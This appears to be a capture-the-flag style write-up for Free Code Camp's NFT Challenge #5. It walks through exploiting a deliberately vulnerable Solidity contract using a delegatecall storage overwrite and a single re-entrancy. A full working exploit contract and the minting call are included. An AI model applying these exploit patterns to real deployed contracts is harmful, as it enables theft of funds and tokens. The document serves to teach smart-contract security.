# Free Code Camp NFT Challenge #5

# Problems
We need to execute the `MintNFT` function in the main contract, before minting the NFT, the contract checks for the following

```ts
function mintNft(address yourAddress, bytes4 selector) public returns (uint256) {
        //is the getOwner function of your contract returns your address/msg.sender?
        if (OtherContract(yourAddress).getOwner() != msg.sender) {
            revert CourseCompletedNFT__NotOwnerOfOtherContract();
        }
        //does both of the function call below returns True? 
        bool returnedOne = s_vulnerableContract.callContract(yourAddress);
        bool returnedTwo = s_vulnerableContract.callContractAgain(yourAddress, selector);

        if (!returnedOne && !returnedTwo) {
            revert CourseCompletedNFT__Nope();
        }
    }
```

Looking deeper at the `VulnerableContract`,

```js
uint256 public s_variable = 0;
uint256 public s_otherVar = 0;
function callContract(address yourAddress) public returns (bool) {
        //does the doSomething function of your contract returns True?
        (bool success, ) = yourAddress.delegatecall(abi.encodeWithSignature("doSomething()"));
        require(success);
        //??? s_variable must have value 123?
        if (s_variable != 123) {
            revert VulnerableContract__NopeCall();
        }
        s_variable = 0;
        return true;
    }

    function callContractAgain(address yourAddress, bytes4 selector) public returns (bool) {
        s_otherVar = s_otherVar + 1;
        //does the function with the specified selector of your contract returns True?
        (bool success, ) = yourAddress.call(
            abi.encodeWithSelector(selector)
        );
        require(success);

        //??? s_otherVar must have value 2? shouldn't it be 1?
        if (s_otherVar == 2) {
            return true;
        }
        s_otherVar = 0;
        return false;
    }
```

Ok, so we need to make a contract that fulfills both of the function in `vulnerableContract`, but how?

# Noticing the attack vectors
Hmmmm.... the first function use delegateCall instead of normal call, a bit sus innit? 

the second function is making an external function in your contract with the selector,  A common exploit on an external call to untrusted contract is Re-entrancy Attack, so maybe it is how we attack it?

# Understanding delegateCall
delegateCall is a function that allows you to call a function in another contract, but the context of the caller is the current contract, so the `msg.sender` is the current contract, not the caller of the function.

In short , it copy the function of the target Contract and execute it in current contract(storage, `msg.sender`, etc)

For example if the `doSomething()` of target contract modify the first variable on the storage slot to `69`, the first storage slot on the current contract will also be modified to `69`

# Understanding Re-entrancy Attack
Re-entrancy Attack is a type of attack that allows the attacker to call the same function again before the function is finished, so the attacker can call the function again and again, and the function will be executed multiple times before the first one is completed. Kinda like how recursive works.

# Building the attack contract
We can notice that the `s_variable` is stored the first storage slot.
```js
contract VulnerableContract {
    error ...
    uint256 public s_variable = 0;
```
Since the first function call used delegateCall on our function `doSomething()`, to modify the `s_variable` to `123` we just need to modify the first storage slot to `123` in our function.

```js
contract Exploit{
    uint firstStorage;  //variable on first storage slot
 
    function doSomething() public returns (bool){
        firstStorage = 123;
        return true;
    }
```

The second function call we need to re-entrance the function. And we need to do that just once so the `s_otherVar` == 2 Therefore the `if(step%2==0)`. since we know that this function will only by called by the `VulnerableContract`, we can just use `VulnerableContract(msg.sender)`. We also need to make sure the contract will call our function again so we input the our function selector to the parameter. The bytes memory are just there to fullfil the interface.

```js
uint step;//re-entrancy counter
//JOKOWI IS JUST AN ARBITRARY NAME, TRUST ME
function jokowi() public returns (bool, bytes memory){
        step = ++step;
        if(step%2 == 0){
            return (true, abi.encode(true));
        }
        VulnerableContract(msg.sender).callContractAgain(address(this), bytes4(keccak256("jokowi()")));
        bytes memory co = bytes('asu');
        return (true, co);
    }
```

Don't forget for the `getOwner()` that will return our address. you can hardcode it or just use tx.origin.
    
```js
function getOwner() public view returns (address){
        return tx.origin;
}
```

# Final contract
```js
contract Exploit{
    uint firstStorage;  //variable on first storage slot
    uint step=0; //re-entrancy counter

    function doSomething() public returns (bool){
        firstStorage = 123;
        return true;
    }

    function jokowi() public returns (bool, bytes memory){
        step = ++step;
        if(step%2 == 0){
            return (true, abi.encode(true));
        }
        VulnerableContract(msg.sender).callContractAgain(address(this), bytes4(keccak256("jokowi()")));
        bytes memory co = bytes('asu');
        return (true, co);
    }

    function getOwner() public view returns (address){
        return tx.origin;
    }
} 
```

# calling the mintNFT function
```js
await contract.mintNft(YOUR_DEPLOYED_EXPLOIT_CONTRACT_ADDRESS, bytes4(keccak256("jokowi()")));
```
